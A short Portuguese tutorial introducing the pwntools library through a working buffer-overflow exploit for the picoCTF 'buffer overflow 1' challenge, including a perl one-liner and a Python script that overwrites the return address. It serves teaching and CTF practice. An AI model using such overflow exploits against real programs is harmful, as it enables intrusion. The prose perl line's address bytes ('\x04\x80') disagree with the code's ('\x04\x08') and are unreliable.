<img width="30%" src="https://i.imgur.com/CGV9DU1.png"></img>

# pwntools
Pwntools é uma lib do python para escrever alguns exploits, tanto remotos quanto local<br>
Para introduzir em pwntools, vamos usar o challenge `buffer overflow 1` do picoctf, o mesmo que exploramos anteriormente<br><br>

<img src="https://i.imgur.com/12a8qd6.png" width="60%"><br><br>

Esse exploit, é equivalente ao que haviamos usado anteriormente `perl -e 'print "a"x44 . "\xcb\x85\x04\x80"'`<br>

## Features
Comece sempre importando o pwntools `from pwn import *`<br>

* pack address 32 bits
* pack address 64 bits
* send payload
* interactive shell<br><br>

## Source
```python
from pwn import *

# arch
context(arch="i386", os="linux")
p = process("/problems/buffer-overflow-1_0_787812af44ed1f8151c893455eb1a613/vuln")

# payload
# offset EIP 44
# address of win is 0x080485cb

'''
perl -e 'print "a"x44 . "\xcb\x85\x04\x08"'
'''

buf = "a"*44
buf += p32(0x080485cb)

# send exploit
p.sendline(buf)
p.interactive()
```

[pwn](../README.md)<br>
[home](../../README.md)
